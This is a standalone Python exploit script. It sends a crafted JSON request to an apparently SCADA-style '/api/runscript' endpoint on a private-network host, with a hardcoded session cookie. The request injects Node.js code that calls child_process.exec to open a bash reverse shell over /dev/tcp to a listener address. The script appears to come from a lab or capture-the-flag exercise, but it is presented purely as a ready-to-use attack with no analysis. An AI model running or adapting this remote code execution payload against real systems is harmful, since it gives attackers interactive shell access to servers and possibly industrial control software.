import requests
import json

url = "http://192.168.214.35:1881/api/runscript"

# set your listener
lhost = "192.168.45.232"
lport = "1881"
payload = {
    "headers": {
        "normalizedNames": {},
        "lazyUpdate": "null"
    },
    "params": {
        "script": {
            "parameters": [
                {
                    "name": "ok",
                    "type": "tagid",
                    "value": ""
                }
            ],
            "mode": "",
            "id": "",
            "test": "true",
            "name": "ok",
            "outputId": "",
            "code": f"require('child_process').exec('/bin/bash -c \"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1\"')"
        }
    }
}

# request
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Cookie': 'io=ZcM_hy0hLfs_n-MVAAAB'
}

response = requests.post(url, headers=headers, data=json.dumps(payload))

# response
print(response.status_code)
print(response.text)

